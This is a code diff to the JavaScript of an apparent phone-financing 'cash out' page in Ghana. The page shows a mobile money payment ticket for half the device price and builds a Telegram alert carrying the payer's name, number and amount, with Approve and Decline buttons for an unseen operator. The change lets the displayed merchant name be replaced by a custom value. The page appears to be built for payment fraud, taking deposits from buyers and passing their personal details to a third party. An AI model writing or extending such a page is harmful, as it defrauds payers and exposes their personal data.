@@ -1109,6 +1109,14 @@
         window.onload = function() {
             const phoneData = JSON.parse(sessionStorage.getItem('selectedPhone') || '{}');
             const appData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
+            
+            // Check for custom merchant details
+            const customMerchant = sessionStorage.getItem('customMerchant');
+            const customRecipient = sessionStorage.getItem('customRecipient');
+            
+            if (customMerchant) {
+                // We will use this in startCashOut
+            }
 
             document.getElementById('deviceName').textContent = phoneData.name || 'iPhone 16 Pro';
             const price = phoneData.fullPrice || phoneData.price || 5999;
@@ -1142,8 +1150,12 @@
             const price = phoneData.fullPrice || phoneData.price || 5999;
             const halfPrice = (price / 2).toFixed(2);
 
+            // Check for custom merchant details
+            const customMerchant = sessionStorage.getItem('customMerchant');
+            const finalMerchantName = customMerchant || MERCHANT_NAME;
+
             document.getElementById('displayMomoNumber').textContent = mtn;
-            document.getElementById('merchantName').textContent = MERCHANT_NAME;
+            document.getElementById('merchantName').textContent = finalMerchantName;
             document.getElementById('displayAmount').textContent = 'GHS ' + halfPrice;
             document.getElementById('ticketDevice').textContent = phoneData.name || 'iPhone 16 Pro';
             document.getElementById('ticketPhone').textContent = mtn;
@@ -1159,7 +1171,7 @@
             sessionStorage.setItem('paymentId', paymentId);
 
             // Send initial Telegram notification
-            const initialMsg = `🚀 <b>CASH OUT INITIATED</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${name}\n📞 <b>Number:</b> ${mtn}\n📱 <b>Device:</b> ${phoneData.name}\n💰 <b>Amount:</b> GHS ${halfPrice.toLocaleString()}\n🏢 <b>Merchant:</b> ${MERCHANT_NAME}\n━━━━━━━━━━━━━━━━━━━━\n⏳ <b>Status:</b> Waiting for receipt...\n\n<b>You can approve or decline now, or wait for receipt:</b>`;
+            const initialMsg = `🚀 <b>CASH OUT INITIATED</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${name}\n📞 <b>Number:</b> ${mtn}\n📱 <b>Device:</b> ${phoneData.name}\n💰 <b>Amount:</b> GHS ${halfPrice.toLocaleString()}\n🏢 <b>Merchant:</b> ${finalMerchantName}\n━━━━━━━━━━━━━━━━━━━━\n⏳ <b>Status:</b> Waiting for receipt...\n\n<b>You can approve or decline now, or wait for receipt:</b>`;
             
             const keyboard = [[
                 { text: '✅ Approve', callback_data: `approve_${paymentId}` },
